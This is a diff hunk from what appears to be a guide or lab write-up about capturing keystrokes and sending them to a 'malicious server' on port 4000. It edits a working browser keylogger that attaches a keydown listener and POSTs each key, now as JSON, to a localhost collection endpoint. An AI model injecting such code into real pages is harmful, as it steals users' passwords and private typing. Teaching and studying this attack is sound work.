@@ -49,8 +49,8 @@ To capture keystrokes and send them to a malicious server running on port **4000
   if (!window.myLogger) {
     window.myLogger = e => fetch('http://localhost:4000/log', {
       method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: e.key
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ key: e.key })
     });
     document.addEventListener('keydown', window.myLogger);
   }
